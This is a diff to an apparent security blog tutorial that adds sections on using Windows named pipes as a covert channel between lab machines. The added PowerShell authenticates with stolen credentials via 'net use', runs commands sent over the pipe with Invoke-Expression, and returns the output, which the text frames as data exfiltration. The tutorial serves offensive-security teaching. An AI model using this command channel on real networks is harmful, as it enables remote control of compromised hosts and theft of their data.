@@ -76,7 +76,7 @@
                                 <ul>
                                     <li>Attacker system : 192.168.101.12 - Kali Linux</li>
                                     <li>Compromised system : 192.168.101.13 - Windows 10</li>
-                                    <li>Client system : 192.168.101.14 - Windows Server 2019</li>
+                                    <li>Client system : 192.168.101.4 - Windows Server 2019</li>
                                 </ul>
 
                                 The attacker has a remote connection to the compromised system. The compromised system will initialize the pipe called "YahudPipe" and the client system will connect to it.
@@ -88,7 +88,7 @@
                                 A client can connect to a named pipe by creating an object of the class <strong>NamedPipeClientStream(Server, Name)</strong> and calling the method <strong>Connect(Time)</strong> of that object.<br>
                                 To send and to receive data on the pipe, we will use a <strong>StreamWriter</strong> object to write data and <strong>StreamReader</strong> object to read the data sent through the pipe. <br>
                                 <br>
-                                <i>Server code</i>
+                                <i style="color: red;">Server code</i>
                                 <div class="squarebox">
                                     $pipeName = "YahudPipe"; <br>
                                     $pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName); # Creation new pipe object <br>
@@ -99,7 +99,7 @@
                                     Write-Host "Message received :", $msg;
                                 </div>
                                 <br>
-                                <i>Client code</i>
+                                <i style="color: yellow;">Client code</i>
                                 <div class="squarebox">
                                     $pipeServer = "192.168.101.13" <br>
                                     $pipeName = "YahudPipe" <br>
@@ -117,7 +117,77 @@
 
                             <h4 class="mb-0">Authentication</h4>
                             <p>
-                                
+                                Connecting to the named pipe in local does not require any authentication, but when it comes to a connection through network, a authentication will be necessary. <br>
+                                The constructor of the class <strong>NamedPipeClientStream</strong> might take 3 arguments (Server IP, Pipe Name). <br>
+                                <div class="squarebox">
+                                    Local pipe: <strong>\\.\\PipeName</strong> <br>
+                                    Network pipe : <strong>\\[ServerIP]\\PipeName</strong> <br>
+                                </div>
+
+                                Without any authentication method, an exception will be called descripbing that the username or password is incorrect. 
+
+                                <img src="img/namedpipe/auth_failed.jpg" class="img-fluid" width="800">
+
+                                A way to authenticate the machine through another system of the network is similar as accessing to a network share of a system. We can use <strong>net use</strong> command to connect a computer from a share resource.
+
+                                <div class="squarebox">net use \\[ServerIP] /user:[Username] [Password]</div>
+
+                                The user account used in the <strong>net use</strong> command must be an account from the system itself. Since from our scenario, the system that create the pipe is compromised, the attacker knows the credential of an account of that system. <br>
+                                <br>
+                                Therefore, on the client script, the attacker can specify those credentials to connect to the pipe.
+
+                                <div class="squarebox">
+                                    $auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password <br>
+                                    Invoke-Expression -Command $auth
+                                </div>
+
+                                With powershell, the cmdlet <strong>Invoke-expression</strong> runs a command on the local machine
+                            </p>
+
+                            <h4 class="mb-0">Command execution</h4>
+                            <p>
+                                On the previous section, we've seen that it is possible to send message from the server to client and execute a net use command to authenticate to another system through network. So with the named pipe functionnalities, the server can send command to the client and the client immediately execute it.
+
+                                <img src="img/namedpipe/sending_message.jpg" class="img-fluid" width="500">
+
+                                The method WriteLine() and ReadLine() of the class StreamWriter and StreamReader will send and receive the message through the pipe. <br>
+                                <br>
+                                <i style="color: red">Server code :</i>
+                                <div class="squarebox">
+                                    $command = Read-Host "Run command" <br>
+                                    $sw.WriteLine($command)
+                                </div>
+                                <br>
+                                <i style="color: yellow;">Client code :</i>
+                                <div class="squarebox">
+                                    $command = $sr.ReadLine() <br>
+                                    Invoke-Expression -Command $command
+                                </div>
+
+                                Now if the server want to get the output of the command, we can store the command in a variable and send it through the pipe. <br>
+                                <br>
+                                <i style="color: yellow;">Client code :</i>
+                                <div class="squarebox">
+                                    $command = $sr.ReadLine() <br>
+                                    $result = Invoke-Expression -Command $command <br>
+                                    $sw.WriteLine($result.Length) # Sending lenght of the command result to Server <br>
+                                    for($cpt = 0; $cpt -lt $result.Length; $cpt++){ <br>
+                                        &emsp;$sw.WriteLine($result[$cpt]) <br>
+                                    }
+                                </div>
+                                <i style="color: red">Server code :</i>
+                                <div class="squarebox">
+                                    $lenght = [int]$sr.ReadLine() # Get the lenght of the command executed by the client <br>
+                                    for($cpt = 0; $cpt -lt $lenght; $cpt++){ <br>
+                                        &emsp;$result = $sr.ReadLine() <br>
+                                       &emsp;Write-Host $result <br>
+                                    } 
+                                </div>
+                                Example : <strong>Running IPCONFIG</strong>
+                                <img src="img/namedpipe/command_exe.jpg" class="img-fluid" width="700">
+                                In this example, we ran "ipconfig" to get the ip address information, but this also means "data exfiltration", we could have navigated through different path "C:\Users\[Username]\Documents" or check mapped drives with "<strong>net use</strong>" or check local account "<strong>net user</strong>"...
+
+
                             </p>
 
                     </div>
